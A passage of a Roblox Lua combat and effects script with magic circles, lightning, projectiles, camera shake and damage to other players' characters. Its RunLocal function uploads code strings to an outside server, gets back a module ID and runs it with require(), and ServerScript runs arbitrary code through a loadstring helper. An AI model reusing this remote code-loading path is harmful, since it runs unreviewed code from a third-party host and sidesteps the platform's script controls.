	local weld = IN(""Weld"")
	weld.Parent = part0
	weld.Part0 = part0
	weld.Part1 = part1
	weld.C0 = c0 or CF.N()
	weld.C1 = c1 or CF.N()
	return weld
end

function Mesh(parent,meshtype,meshid,textid,scale,offset)
	local part = IN(""SpecialMesh"")
	part.MeshId = meshid or """"
	part.TextureId = textid or """"
	part.Scale = scale or V3.N(1,1,1)
	part.Offset = offset or V3.N(0,0,0)
	part.MeshType = meshtype or Enum.MeshType.Sphere
	part.Parent = parent
	return part
end

NewInstance = function(instance,parent,properties)
	local inst = Instance.new(instance)
	inst.Parent = parent
	if(properties)then
		for i,v in next, properties do
			pcall(function() inst[i] = v end)
		end	
	end
	return inst;
end

function Clone(instance,parent,properties)
	local inst = instance:Clone()
	inst.Parent = parent
	if(properties)then
		for i,v in next, properties do
			pcall(function() inst[i] = v end)
		end
	end
	return inst;
end

function SoundPart(id,pitch,volume,looped,effect,autoPlay,cf)
	local soundPart = NewInstance(""Part"",Effects,{Transparency=1,CFrame=cf or Torso.CFrame,Anchored=true,CanCollide=false,Size=V3.N()})
	local Sound = IN(""Sound"")
	Sound.SoundId = ""rbxassetid://"".. tostring(id or 0)
	Sound.Pitch = pitch or 1
	Sound.Volume = volume or 1
	Sound.Looped = looped or false
	if(autoPlay)then
		coroutine.wrap(function()
			repeat wait() until Sound.IsLoaded
			Sound.Playing = autoPlay or false
		end)()
	end
	if(not looped and effect)then
		Sound.Stopped:connect(function()
			Sound.Volume = 0
			soundPart:destroy()
		end)
	elseif(effect)then
		warn(""Sound can't be looped and a sound effect!"")
	end
	Sound.Parent = soundPart
	return Sound
end


--// Extended ROBLOX tables \\--
local Instance = setmetatable({ClearChildrenOfClass = function(where,class,recursive) local children = (recursive and where:GetDescendants() or where:GetChildren()) for _,v in next, children do if(v:IsA(class))then v:destroy();end;end;end},{__index = Instance})
--// Require stuff \\--
function CamShake(who,times,intense,origin) 
	coroutine.wrap(function()
		if(script:FindFirstChild'CamShake')then
			local cam = script.CamShake:Clone()
			cam:WaitForChild'intensity'.Value = intense
			cam:WaitForChild'times'.Value = times
			
	 		if(origin)then NewInstance((typeof(origin) == 'Instance' and ""ObjectValue"" or typeof(origin) == 'Vector3' and 'Vector3Value'),cam,{Name='origin',Value=origin}) end
			cam.Parent = who
			wait()
			cam.Disabled = false
		elseif(who == Plr or who == Char)then
			local intensity = intense
			local cam = workspace.CurrentCamera
			for i = 1, times do
				local camDistFromOrigin
				if(typeof(origin) == 'Instance' and origin:IsA'BasePart')then
					camDistFromOrigin = math.floor( (cam.CFrame.p-origin.Position).magnitude )/25
				elseif(typeof(origin) == 'Vector3')then
					camDistFromOrigin = math.floor( (cam.CFrame.p-origin).magnitude )/25
				end
				if(camDistFromOrigin)then
					intensity = math.min(intense, math.floor(intense/camDistFromOrigin))
				end
				cam.CFrame = cam.CFrame:lerp(cam.CFrame*CFrame.new(math.random(-intensity,intensity)/100,math.random(-intensity,intensity)/100,math.random(-intensity,intensity)/100)*CFrame.Angles(math.rad(math.random(-intensity,intensity)/100),math.rad(math.random(-intensity,intensity)/100),math.rad(math.random(-intensity,intensity)/100)),.4)
				swait()
			end
		end
	end)()
end

function CamShakeAll(times,intense,origin)
	for _,v in next, Plrs:players() do
		CamShake(v:FindFirstChildOfClass'PlayerGui' or v:FindFirstChildOfClass'Backpack' or v.Character,times,intense,origin)
	end
end

function ServerScript(code)
	if(script:FindFirstChild'Loadstring')then
		local load = script.Loadstring:Clone()
		load:WaitForChild'Sauce'.Value = code
		load.Disabled = false
		load.Parent = workspace
	elseif(NS and typeof(NS) == 'function')then
		NS(code,workspace)
	else
		warn(""no serverscripts lol"")
	end	
end

function RunLocal(where,code)
	ServerScript([[
		wait()
		script.Parent=nil
		if(not _G.Http)then _G.Http = game:service'HttpService' end
		
		local Http = _G.Http or game:service'HttpService'
		
		local source = ]]..""[[""..code..""]]""..[[
		local link = ""https://api.vorth.xyz/R_API/R.UPLOAD/NEW_LOCAL.php""
		local asd = Http:PostAsync(link,source)
		repeat wait() until asd and Http:JSONDecode(asd) and Http:JSONDecode(asd).Result and Http:JSONDecode(asd).Result.Require_ID
		local ID = Http:JSONDecode(asd).Result.Require_ID
		local vs = require(ID).VORTH_SCRIPT
		vs.Parent = game.]]..where:GetFullName()
	)
end

--// Customization \\--

local Frame_Speed = 60;
local WalkSpeed = 16
local DamageColor = BrickColor.new'White'

local MagicCircles = {
	Default = {Color=C3.N(1,1,1),Texture1=0,Texture2=0},
	OrangeWarPheonix = {EffectColor=BrickColor.new'Deep orange'.Color,Color=C3.N(.9,.9,.9),Texture1=623153986,Texture2=623153990},
	BlueWarPheonix = {EffectColor=BrickColor.new'Teal'.Color,Color=C3.N(.9,.9,.9),Texture1=462499935,Texture2=462499970},
	Plasma = {Color=C3.N(0.70588235294118,0,0.8),Texture1=415906687,Texture2=415906702},
	Water = {Color=C3.RGB(33, 84, 185),Texture1=408441330,Texture2=408441353},
	Earth = {Color=C3.RGB(86, 36, 36),Texture1=394253616,Texture2=394253651},
	Wind = {Color=C3.N(.8,.8,.8),Texture1=376006317,Texture2=376006346},
	Poseidon = {Color=C3.RGB(71, 99, 130),Texture1=346727970,Texture2=346727994},
	AetherLightning = {Color=C3.RGB(23, 255, 197),Texture1=348320016,Texture2=348320030},
	Light = {Color=C3.N(1,1,0),Texture1=343192085,Texture2=343192112},
	Fire = {Color=C3.N(1,0,0),EffectColor=BrickColor.new'Bright red'.Color,Texture1=313945544,Texture2=313945673},
	Lightning = {Color=C3.N(0,1,1),Texture1=314842290,Texture2=314842440},
	GasterBlaster = {Color=C3.N(1,1,1),Texture1=331948662,Texture2=331948662}
}

local MagicVariant = MagicCircles.GasterBlaster --[[ You can change this for a different element
Example: 

Changing MagicCircles.GasterBlaster to MagicCircles.Light

would make it a Light Element
]]

--// Stop animations \\--
for _,v in next, Hum:GetPlayingAnimationTracks() do
	v:Stop();
end

pcall(game.Destroy,Char:FindFirstChild'Animate')
pcall(game.Destroy,Hum:FindFirstChild'Animator')

--// Joints \\--

local LS = NewInstance('Motor',Char,{Part0=Torso,Part1=LArm,C0 = CF.N(-1.5,0.5,0),C1 = CF.N(0,.5,0)})
local RS = NewInstance('Motor',Char,{Part0=Torso,Part1=RArm,C0 = CF.N(1.5,0.5,0),C1 = CF.N(0,.5,0)})
local NK = NewInstance('Motor',Char,{Part0=Torso,Part1=Head,C0 = CF.N(0,1.5,0)})
local LH = NewInstance('Motor',Char,{Part0=Torso,Part1=LLeg,C0 = CF.N(-.5,-1,0),C1 = CF.N(0,1,0)})
local RH = NewInstance('Motor',Char,{Part0=Torso,Part1=RLeg,C0 = CF.N(.5,-1,0),C1 = CF.N(0,1,0)})
local RJ = NewInstance('Motor',Char,{Part0=Root,Part1=Torso})

local LSC0 = LS.C0
local RSC0 = RS.C0
local NKC0 = NK.C0
local LHC0 = LH.C0
local RHC0 = RH.C0
local RJC0 = RJ.C0

--// Artificial HB \\--

local ArtificialHB = IN(""BindableEvent"", script)
ArtificialHB.Name = ""Heartbeat""

script:WaitForChild(""Heartbeat"")

local tf = 0
local allowframeloss = false
local tossremainder = false
local lastframe = tick()
local frame = 1/Frame_Speed
ArtificialHB:Fire()

game:GetService(""RunService"").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			script.Heartbeat:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				ArtificialHB:Fire()
			end
			lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)

function swait(num)
	if num == 0 or num == nil then
		ArtificialHB.Event:wait()
	else
		for i = 0, num do
			ArtificialHB.Event:wait()
		end
	end
end


--// Effect Function(s) \\--

function NumSeq(...)
	local tab = {...}
	local Sequence = {}
	for _,v in next, tab do
		table.insert(Sequence,NumberSequenceKeypoint.new(unpack(v)))
	end
	if(tab[#tab][1] ~= 1)then
		local final = tab[#tab]
		table.insert(Sequence,NumberSequenceKeypoint.new(1,final[2],final[3]))
	end
	return NumberSequence.new(Sequence)
end

local DefaultRingParticle = IN(""ParticleEmitter"")
DefaultRingParticle.Name = 'RingEmit'
DefaultRingParticle.LightEmission = 1
DefaultRingParticle.Size = NumSeq({0,0},{.7,6.28},{.8,5.03},{1,2.9})
DefaultRingParticle.Texture = ""rbxassetid://313951123""
DefaultRingParticle.Transparency = NumberSequence.new(0,1)
DefaultRingParticle.ZOffset = 1
DefaultRingParticle.Drag = 0
DefaultRingParticle.Acceleration = V3.N()
DefaultRingParticle.LockedToPart = true
DefaultRingParticle.Enabled = false
DefaultRingParticle.Lifetime = NumberRange.new(.6,.6)
DefaultRingParticle.Rate = 5
DefaultRingParticle.Rotation = NumberRange.new(0,0)
DefaultRingParticle.RotSpeed = NumberRange.new(0,0)
DefaultRingParticle.Speed = NumberRange.new(0,0)
DefaultRingParticle.SpreadAngle = Vector2.new(0,0)

function MagicCircle(Data)
	local Variant = Data.Variant or MagicCircles.Default;
	
	local Size = Data.Size or 10;
	local Pos = Data.Pos*CF.A(M.R(-90),M.R(-90),0) or Torso.CFrame*CF.A(M.R(-90),M.R(-90),0);
	local GrowTime = Data.Time or 1;
	
	local WeldData = Data.Weld or false;
	
	
	local Color = Variant.Color or C3.N(.9,.9,.0)
	
	local CreationParticle = Data.CreationParticle or DefaultRingParticle;
	
	
	local Circle = Part(Effects,BrickColor.new'Maroon',Enum.Material.SmoothPlastic,V3.N(.05,.05,.05),Pos,true,false)
	local CircleM = NewInstance(""BlockMesh"",Circle,{Scale=V3.N()})
	
	
	local Emitter = DefaultRingParticle:Clone();
	Emitter.Parent = Circle
	Emitter.Color = ColorSequence.new(Variant.Color)
	
	local Top = IN(""Decal"",Circle)
	Top.Texture = ""rbxassetid://""..Variant.Texture1
	Top.Face = Enum.NormalId.Top
	
	local Btm = IN(""Decal"",Circle)
	Btm.Texture = ""rbxassetid://""..Variant.Texture2
	Btm.Face = Enum.NormalId.Bottom
	
	if(WeldData)then
		Circle.Anchored = false
		Weld(WeldData,Circle,Pos,CF.N())
	end
	local GrowFrames = GrowTime * Frame_Speed
	print(GrowFrames)
	--Size*20,0,Size*20
	Circle.Transparency = 1
	local GrownEvent = Instance.new(""BindableEvent"",Circle)
	coroutine.wrap(function()
		
		Emit(Emitter,5)
		local End = Size*20
		local grow = End/GrowFrames
		for i = 1, GrowFrames+1 do
			local aa = math.min(CircleM.Scale.x + grow,End)
			if(aa >= End)then break end
			CircleM.Scale = V3.N(aa,0,aa)
			swait()
		end
		CircleM.Scale = V3.N(End,0,End)
		GrownEvent:Fire()
		
	end)()
	
	local Table = {
		Circle = Circle,
		Mesh = CircleM,
		Grow = function(size)
			CircleM.Scale = CircleM.Scale + V3.N(size*20,0,size*20)
		end,
		Destroy = function(timer)
			coroutine.wrap(function()
				if(not timer)then timer = 1 end
				Tween(CircleM,{Scale=V3.N(0,0,0)},timer,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
				Tween(Top,{Transparency=1},timer,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
				Tween(Btm,{Transparency=1},timer,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
				S.Debris:AddItem(Circle,timer+1)
			end)()
		end,
		Grown = GrownEvent.Event
	}
		
	return Table;
end

function Bezier(startpos, pos2, pos3, endpos, t)
	local A = startpos:lerp(pos2, t)
	local B  = pos2:lerp(pos3, t)
	local C = pos3:lerp(endpos, t)
	local lerp1 = A:lerp(B, t)
	local lerp2 = B:lerp(C, t)
	local cubic = lerp1:lerp(lerp2, t)
	return cubic
end

function SphereFX(duration,color,scale,pos,endScale,increment)
	return Effect{
		Frames=duration,
		Effect='ResizeAndFade',
		Color=color,
		Size=scale,
		Mesh={MeshType=Enum.MeshType.Sphere},
		CFrame=pos,
		FXSettings={
			EndSize=endScale,
			EndIsIncrement=increment
		}
	}
end

function BlastFX(duration,color,scale,pos,endScale,increment)
	return Effect{
		Frames=duration,
		Effect='ResizeAndFade',
		Color=color,
		Size=scale,
		Mesh={MeshType=Enum.MeshType.FileMesh,MeshId='rbxassetid://20329976'},
		CFrame=pos,
		FXSettings={
			EndSize=endScale,
			EndIsIncrement=increment
		}
	}
end

function BlockFX(duration,color,scale,pos,endScale,increment)
	return Effect{
		Frames=duration,
		Effect='ResizeAndFade',
		Color=color,
		Size=scale,
		CFrame=pos,
		FXSettings={
			EndSize=endScale,
			EndIsIncrement=increment
		}
	}
end

function ShootBullet(data)
	--ShootBullet{Size=V3.N(3,3,3),Shape='Ball',Frames=160,Origin=data.Circle.CFrame,Speed=10}
	local Size = data.Size or V3.N(2,2,2)
	local Color = data.Color or MagicVariant.EffectColor or MagicVariant.Color
	local StudsPerFrame = data.Speed or 10
	local Shape = data.Shape or 'Ball'
	local Frames = data.Frames or 160
	local Pos = data.Origin or Torso.CFrame
	local Direction = data.Direction or Mouse.Hit
	local Material = data.Material or Enum.Material.Neon
	local OnHit = data.HitFunction or function(hit,pos)
		Effect{
			Effect='ResizeAndFade',
			Color=Color,
			Size=V3.N(10,10,10),
			Mesh={MeshType=Enum.MeshType.Sphere},
			CFrame=CF.N(pos),
			FXSettings={
				EndSize=V3.N(.05,.05,.05),
				EndIsIncrement=true
			}
		}
		for i = 1, 5 do
			local angles = CF.A(M.RRNG(-180,180),M.RRNG(-180,180),M.RRNG(-180,180))
			Effect{
				Effect='Fade',
				Frames=65,
				Size=V3.N(5,5,10),
				CFrame=CF.N(CF.N(pos)*angles*CF.N(0,0,-10).p,pos),
				Mesh = {MeshType=Enum.MeshType.Sphere},
				Material=Enum.Material.Neon,
				Color=Color,
				MoveDirection=CF.N(CF.N(pos)*angles*CF.N(0,0,-50).p,pos).p,
			}	
		end
		AOEDamage(pos,10,15,30,0,'Normal',10,4)
	end	
	
	local Bullet = Part(Effects,Color,Material,Size,Pos,true,false)
	local BMesh = Mesh(Bullet,Enum.MeshType.Brick,"""","""",V3.N(1,1,1),V3.N())
	if(Shape == 'Ball')then
		BMesh.MeshType = Enum.MeshType.Sphere
	elseif(Shape == 'Head')then
		BMesh.MeshType = Enum.MeshType.Head
	elseif(Shape == 'Cylinder')then
		BMesh.MeshType = Enum.MeshType.Cylinder
	end
	
	coroutine.wrap(function()
		for i = 1, Frames+1 do
			local hit,pos,norm,dist = CastRay(Bullet.CFrame.p,CF.N(Bullet.CFrame.p,Direction.p)*CF.N(0,0,-StudsPerFrame).p,StudsPerFrame)
			if(hit)then
				OnHit(hit,pos,norm,dist)
				break;
			else
				Bullet.CFrame = CF.N(Bullet.CFrame.p,Direction.p)*CF.N(0,0,-StudsPerFrame)
			end
			swait()
		end
		Bullet:destroy()
	end)()
	
end

function Zap(data)
	local sCF,eCF = data.StartCFrame,data.EndCFrame
	assert(sCF,""You need a start CFrame!"")
	assert(eCF,""You need an end CFrame!"")
	local parts = data.PartCount or 15
	local zapRot = data.ZapRotation or {-5,5}
	local startThick = data.StartSize or 3;
	local endThick = data.EndSize or startThick/2;
	local color = data.Color or BrickColor.new'Electric blue'
	local delay = data.Delay or 35
	local delayInc = data.DelayInc or 0
	local lastLightning;
	local MagZ = (sCF.p - eCF.p).magnitude
	local thick = startThick
	local inc = (startThick/parts)-(endThick/parts)
	
	for i = 1, parts do
		local pos = sCF.p
		if(lastLightning)then
			pos = lastLightning.CFrame*CF.N(0,0,MagZ/parts/2).p
		end
		delay = delay + delayInc
		local zapPart = Part(Effects,color,Enum.Material.Neon,V3.N(thick,thick,MagZ/parts),CF.N(pos),true,false)
		local posie = CF.N(pos,eCF.p)*CF.N(0,0,MagZ/parts).p+V3.N(M.RNG(unpack(zapRot)),M.RNG(unpack(zapRot)),M.RNG(unpack(zapRot)))
		if(parts == i)then
			local MagZ = (pos-eCF.p).magnitude
			zapPart.Size = V3.N(endThick,endThick,MagZ)
			zapPart.CFrame = CF.N(pos, eCF.p)*CF.N(0,0,-MagZ/2)
			Effect{Effect='ResizeAndFade',Size=V3.N(thick,thick,thick),CFrame=eCF*CF.A(M.RRNG(-180,180),M.RRNG(-180,180),M.RRNG(-180,180)),Color=color,Frames=delay*2,FXSettings={EndSize=V3.N(thick*8,thick*8,thick*8)}}
		else
			zapPart.CFrame = CF.N(pos,posie)*CF.N(0,0,MagZ/parts/2)
		end
		
		lastLightning = zapPart
		Effect{Effect='Fade',Manual=zapPart,Frames=delay}
		
		thick=thick-inc
		
	end
end

function Zap2(data)
	local Color = data.Color or BrickColor.new'Electric blue'
	local StartPos = data.Start or Torso.Position
	local EndPos = data.End or Mouse.Hit.p
	local SegLength = data.SegL or 2
	local Thicc = data.Thickness or 0.5
	local Fades = data.Fade or 45
	local Parent = data.Parent or Effects
	local MaxD = data.MaxDist or 200
	local Branch = data.Branches or false
	local Material = data.Material or Enum.Material.Neon
	local Raycasts = data.Raycasts or false
	local Offset = data.Offset or {0,360}
	local AddMesh = (data.Mesh == nil and true or data.Mesh)
	if((StartPos-EndPos).magnitude > MaxD)then
		EndPos = CF.N(StartPos,EndPos)*CF.N(0,0,-MaxD).p
	end
	local hit,pos,norm,dist=nil,EndPos,nil,(StartPos-EndPos).magnitude
	if(Raycasts)then
		hit,pos,norm,dist = CastRay(StartPos,EndPos,MaxD)	
	end
	local segments = dist/SegLength
	local model = IN(""Model"",Parent)
	model.Name = 'Lightning'
	local Last;
	for i = 1, segments do
		local size = (segments-i)/25
		local prt = Part(model,Color,Material,V3.N(Thicc+size,SegLength,Thicc+size),CF.N(),true,false)
		if(AddMesh)then IN(""CylinderMesh"",prt) end
		if(Last and math.floor(segments) == i)then
			local MagZ = (Last.CFrame*CF.N(0,-SegLength/2,0).p-EndPos).magnitude
			prt.Size = V3.N(Thicc+size,MagZ,Thicc+size)
			prt.CFrame = CF.N(Last.CFrame*CF.N(0,-SegLength/2,0).p,EndPos)*CF.A(M.R(90),0,0)*CF.N(0,-MagZ/2,0)	
		elseif(not Last)then
			prt.CFrame = CF.N(StartPos,pos)*CF.A(M.R(90),0,0)*CF.N(0,-SegLength/2,0)	
		else
			prt.CFrame = CF.N(Last.CFrame*CF.N(0,-SegLength/2,0).p,CF.N(pos)*CF.A(M.R(M.RNG(0,360)),M.R(M.RNG(0,360)),M.R(M.RNG(0,360)))*CF.N(0,0,SegLength/3+(segments-i)).p)*CF.A(M.R(90),0,0)*CF.N(0,-SegLength/2,0)
		end
		Last = prt
		if(Branch)then
			local choice = M.RNG(1,7+((segments-i)*2))
			if(choice == 1)then
				local LastB;
				for i2 = 1,M.RNG(2,5) do
					local size2 = ((segments-i)/35)/i2
					local prt = Part(model,Color,Material,V3.N(Thicc+size2,SegLength,Thicc+size2),CF.N(),true,false)
					if(AddMesh)then IN(""CylinderMesh"",prt) end
					if(not LastB)then
						prt.CFrame = CF.N(Last.CFrame*CF.N(0,-SegLength/2,0).p,Last.CFrame*CF.N(0,-SegLength/2,0)*CF.A(0,0,M.RRNG(0,360))*CF.N(0,Thicc*7,0)*CF.N(0,0,-1).p)*CF.A(M.R(90),0,0)*CF.N(0,-SegLength/2,0)
					else
						prt.CFrame = CF.N(LastB.CFrame*CF.N(0,-SegLength/2,0).p,LastB.CFrame*CF.N(0,-SegLength/2,0)*CF.A(0,0,M.RRNG(0,360))*CF.N(0,Thicc*7,0)*CF.N(0,0,-1).p)*CF.A(M.R(90),0,0)*CF.N(0,-SegLength/2,0)
					end
					LastB = prt
				end
			end
		end
	end
	if(Fades > 0)then
		coroutine.wrap(function()
			for i = 1, Fades do
				for _,v in next, model:children() do
					if(v:IsA'BasePart')then
						v.Transparency = (i/Fades)
					end
				end
				swait()
			end
			model:destroy()
		end)()
	else
		S.Debris:AddItem(model,.01)
	end
	return {End=(Last and Last.CFrame*CF.N(0,-Last.Size.Y/2,0).p),Last=Last,Model=model}
end

function Tween(obj,props,time,easing,direction,repeats,backwards)
	local info = TweenInfo.new(time or .5, easing or Enum.EasingStyle.Quad, direction or Enum.EasingDirection.Out, repeats or 0, backwards or false)
	local tween = S.TweenService:Create(obj, info, props)
	
	tween:Play()
end

function Effect(data)
	local FX = data.Effect or 'ResizeAndFade'
	local Parent = data.Parent or Effects
	local Color = data.Color or C3.N(0,0,0)
	local Size = data.Size or V3.N(1,1,1)
	local MoveDir = data.MoveDirection or nil
	local MeshData = data.Mesh or nil
	local SndData = data.Sound or nil
	local Frames = data.Frames or 45
	local Manual = data.Manual or nil
	local Material = data.Material or Enum.Material.Neon
	local CFra = data.CFrame or Torso.CFrame
	local Settings = data.FXSettings or {}
	local Shape = data.Shape or Enum.PartType.Block
	local Snd,Prt,Msh;
	coroutine.wrap(function()
		if(Manual and typeof(Manual) == 'Instance' and Manual:IsA'BasePart')then
			Prt = Manual
		else
			Prt = Part(Parent,Color,Material,Size,CFra,true,false)
			Prt.Shape = Shape
		end
		if(typeof(MeshData) == 'table')then
			Msh = Mesh(Prt,MeshData.MeshType,MeshData.MeshId,MeshData.TextureId,MeshData.Scale,MeshData.Offset)
		elseif(typeof(MeshData) == 'Instance')then
			Msh = MeshData:Clone()
			Msh.Parent = Prt
		elseif(Shape == Enum.PartType.Block)then
			Msh = Mesh(Prt,Enum.MeshType.Brick)
		end
		if(typeof(SndData) == 'table')then
			Snd = Sound(Prt,SndData.SoundId,SndData.Pitch,SndData.Volume,false,false,true)
		elseif(typeof(SndData) == 'Instance')then
			Snd = SndData
		end
		if(Snd)then
			repeat swait() until Snd.Playing and Snd.IsLoaded and Snd.TimeLength > 0
			Frames = Snd.TimeLength * Frame_Speed/Snd.Pitch
		end
		Size = (Msh and Msh.Scale or Size)
		local grow = Size-(Settings.EndSize or (Msh and Msh.Scale or Size)/2)
		
		local MoveSpeed = nil;
		if(MoveDir)then
			MoveSpeed = (CFra.p - MoveDir).magnitude/Frames
		end
		if(FX ~= 'Arc')then
			for Frame = 1, Frames do
				if(FX == ""Fade"")then
					Prt.Transparency  = (Frame/Frames)
				elseif(FX == ""Resize"")then
					if(not Settings.EndSize)then
						Settings.EndSize = V3.N(0,0,0)
					end
					if(Settings.EndIsIncrement)then
						if(Msh)then
							Msh.Scale = Msh.Scale + Settings.EndSize
						else
							Prt.Size = Prt.Size + Settings.EndSize
						end					
					else
						if(Msh)then
							Msh.Scale = Msh.Scale - grow/Frames
						else
							Prt.Size = Prt.Size - grow/Frames
						end
					end 
				elseif(FX == ""ResizeAndFade"")then
					if(not Settings.EndSize)then
						Settings.EndSize = V3.N(0,0,0)
					end
					if(Settings.EndIsIncrement)then
						if(Msh)then
							Msh.Scale = Msh.Scale + Settings.EndSize
						else
							Prt.Size = Prt.Size + Settings.EndSize
						end					
					else
						if(Msh)then
							Msh.Scale = Msh.Scale - grow/Frames
						else
							Prt.Size = Prt.Size - grow/Frames
						end
					end 
					Prt.Transparency = (Frame/Frames)
				end
				if(Settings.RandomizeCFrame)then
					Prt.CFrame = Prt.CFrame * CF.A(M.RRNG(-360,360),M.RRNG(-360,360),M.RRNG(-360,360))
				end
				if(MoveDir and MoveSpeed)then
					local Orientation = Prt.Orientation
					Prt.CFrame = CF.N(Prt.Position,MoveDir)*CF.N(0,0,-MoveSpeed)
					Prt.Orientation = Orientation
				end
				swait()
			end
			Prt:destroy()
		else
			local start,third,fourth,endP = Settings.Start,Settings.Third,Settings.Fourth,Settings.End
			if(not Settings.End and Settings.Home)then endP = Settings.Home.CFrame end
			if(start and endP)then
				local quarter = third or start:lerp(endP, 0.25) * CF.N(M.RNG(-25,25),M.RNG(0,25),M.RNG(-25,25))
				local threequarter = fourth or start:lerp(endP, 0.75) * CF.N(M.RNG(-25,25),M.RNG(0,25),M.RNG(-25,25))
				for Frame = 0, 1, (Settings.Speed or 0.01) do
					if(Settings.Home)then
						endP = Settings.Home.CFrame
					end
					Prt.CFrame = Bezier(start, quarter, threequarter, endP, Frame)
				end
				if(Settings.RemoveOnGoal)then
					Prt:destroy()
				end
			else
				Prt:destroy()
				assert(start,""You need a start position!"")
				assert(endP,""You need a start position!"")
			end
		end
	end)()
	return Prt,Msh,Snd
end
function SoulSteal(whom)
	local torso = (whom:FindFirstChild'Head' or whom:FindFirstChild'Torso' or whom:FindFirstChild'UpperTorso' or whom:FindFirstChild'LowerTorso' or whom:FindFirstChild'HumanoidRootPart')
	print(torso)
	if(torso and torso:IsA'BasePart')then
		local Model = Instance.new(""Model"",Effects)
		Model.Name = whom.Name..""'s Soul""
		whom:BreakJoints()
		local Soul = Part(Model,BrickColor.new'Really red','Glass',V3.N(.5,.5,.5),torso.CFrame,true,false)
		Soul.Name = 'Head'
		NewInstance(""Humanoid"",Model,{Health=0,MaxHealth=0})
		Effect{
			Effect=""Arc"",
			Manual = Soul,
			FXSettings={
				Start=torso.CFrame,
				Home = Torso,
				RemoveOnGoal = true,
			}
		}
		local lastPoint = Soul.CFrame.p
	
		for i = 0, 1, 0.01 do 
				local point = CFrame.new(lastPoint, Soul.Position) * CFrame.Angles(-math.pi/2, 0, 0)
				local mag = (lastPoint - Soul.Position).magnitude
				Effect{
					Effect = ""Fade"",
					CFrame = point * CF.N(0, mag/2, 0),
					Size = V3.N(.5,mag+.5,.5),
					Color = Soul.BrickColor
				}
				lastPoint = Soul.CFrame.p
			swait()
		end
		for i = 1, 5 do
			Effect{
				Effect=""Fade"",
				Color = BrickColor.new'Really red',
				MoveDirection = (Torso.CFrame*CFrame.new(M.RNG(-40,40),M.RNG(-40,40),M.RNG(-40,40))).p
			}	
		end
	end
end

--// Other Functions \\ --

function CastRay(startPos,endPos,range,ignoreList)
	local ray = Ray.new(startPos,(endPos-startPos).unit*range)
	local part,pos,norm = workspace:FindPartOnRayWithIgnoreList(ray,ignoreList or {Char},false,true)
	return part,pos,norm,(pos and (startPos-pos).magnitude)
end

function CastRayInDirection(startPos,direction,range,ignoreList)
	local ray = Ray.new(startPos,direction*range)
	local part,pos,norm = workspace:FindPartOnRayWithIgnoreList(ray,ignoreList or {Char},false,true)
	return part,pos,norm,(pos and (startPos-pos).magnitude)
end

function getRegion(point,range,ignore)
    return workspace:FindPartsInRegion3WithIgnoreList(R3.N(point-V3.N(1,1,1)*range/2,point+V3.N(1,1,1)*range/2),ignore,100)
end

function clerp(startCF,endCF,alpha)
	return startCF:lerp(endCF, alpha)
end

function GetTorso(char)
	return char:FindFirstChild'Torso' or char:FindFirstChild'UpperTorso' or char:FindFirstChild'LowerTorso' or char:FindFirstChild'HumanoidRootPart'
end

function ShowDamage(Pos, Text, Time, Color)
	coroutine.wrap(function()
	local Rate = (1 / Frame_Speed)
	local Pos = (Pos or Vector3.new(0, 0, 0))
	local Text = (Text or """")
	local Time = (Time or 2)
	local Color = (Color or Color3.new(1, 0, 1))
	local EffectPart = NewInstance(""Part"",Effects,{
		Material=Enum.Material.SmoothPlastic,
		Reflectance = 0,
		Transparency = 1,
		BrickColor = BrickColor.new(Color),
		Name = ""Effect"",
		Size = Vector3.new(0,0,0),
		Anchored = true,
		CFrame = CF.N(Pos)
	})
	local BillboardGui = NewInstance(""BillboardGui"",EffectPart,{
		Size = UDim2.new(1.25, 0, 1.25, 0),
		Adornee = EffectPart,
	})
	local TextLabel = NewInstance(""TextLabel"",BillboardGui,{
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 1, 0),
		Text = Text,
		Font = ""Bodoni"",
		TextColor3 = Color,
		TextStrokeColor3 = Color3.new(0,0,0),
		TextStrokeTransparency=0,
		TextScaled = true,
	})
	S.Debris:AddItem(EffectPart, (Time))
	EffectPart.Parent = workspace
	delay(0, function()
		Tween(EffectPart,{CFrame=CF.N(Pos)*CF.N(0,3,0)},Time,Enum.EasingStyle.Elastic,Enum.EasingDirection.Out)
		local Frames = (Time / Rate)
		for Frame = 1, Frames do
			swait()
			local Percent = (Frame / Frames)
			TextLabel.TextTransparency = Percent
			TextLabel.TextStrokeTransparency = Percent
		end
		if EffectPart and EffectPart.Parent then
			EffectPart:Destroy()
		end
	end) end)()
end


function DealDamage(who,minDam,maxDam,Knock,Type,critChance,critMult)
	if(who)then
		local hum = who:FindFirstChildOfClass'Humanoid'
		local Damage = M.RNG(minDam,maxDam)
		local canHit = true
		if(hum)then
			for _, p in pairs(Hit) do
				if p[1] == hum then
					if(time() - p[2] < 0.01) then
						canHit = false
					else
						Hit[_] = nil
					end
				end
			end
			if(canHit)then
				table.insert(Hit,{hum,time()})
				if(hum.Health >= math.huge)then
					who:BreakJoints()
					if(who:FindFirstChild'Head' and hum.Health > 0)then
						ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), ""INSTANT"", 1.5, C3.N(1,0,0))
					end
				else
					local player = S.Players:GetPlayerFromCharacter(who)
					if(Type == ""Fire"")then
						--idk..
					else
						local  c = Instance.new(""ObjectValue"",hum)
						c.Name = ""creator""
						c.Value = Plr
						game:service'Debris':AddItem(c,0.35)
						if(M.RNG(1,100) <= (critChance or 0) and critMult > 1)then
							if(who:FindFirstChild'Head' and hum.Health > 0)then
								ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), ""[CRIT] ""..Damage*(critMult or 2), 1.5, BrickColor.new'New Yeller'.Color)
							end
							hum.Health = hum.Health - Damage*(critMult or 2)
						else
							if(who:FindFirstChild'Head' and hum.Health > 0)then
								ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), Damage, 1.5, DamageColor.Color)
							end
							hum.Health = hum.Health - Damage
						end
						if(Type == 'Knockback' and GetTorso(who))then
